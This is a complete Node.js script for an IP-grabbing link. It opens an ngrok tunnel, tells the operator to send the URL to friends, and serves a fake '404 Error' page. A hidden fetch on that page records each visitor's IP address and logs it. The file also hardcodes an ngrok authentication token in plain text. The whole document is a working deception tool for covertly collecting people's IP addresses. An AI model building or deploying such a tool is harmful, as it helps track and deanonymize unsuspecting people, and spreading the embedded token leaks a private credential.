#!/usr/bin/env node

const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const requestIp = require("request-ip");
var randomWords = require('random-words');
const ngrok = require('ngrok');

console.log("#eik")

app.use(requestIp.mw());

const randomURL =  ()=> {
    return randomWords(5);
}

const startTunnel = async () => {
    const url = await ngrok.connect({authtoken: "2AfcHgBnBdPrOklta8p2itxKe45_pBBTEx6pJhACeYoswkwj", port: 3000, region: "eu"});
    console.log("Send this to friends: " + url);
};

startTunnel();

let latestIP = "";

app.set('trust proxy', true);

app.get("/", (req, res)=> {
    res.send(`
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Error</title>

</head>
<body>
    404 Error
    <script>
        fetch('/info');
    </script>
</body>
</html>
    `);
})

app.get('/ip', (req, res) => {
    res.json({ ip: latestIP });
});

app.get('/info', (req, res) => {
    latestIP = req.clientIp;
    console.log("New IP address recieved: " + latestIP);
})

server.listen(3000);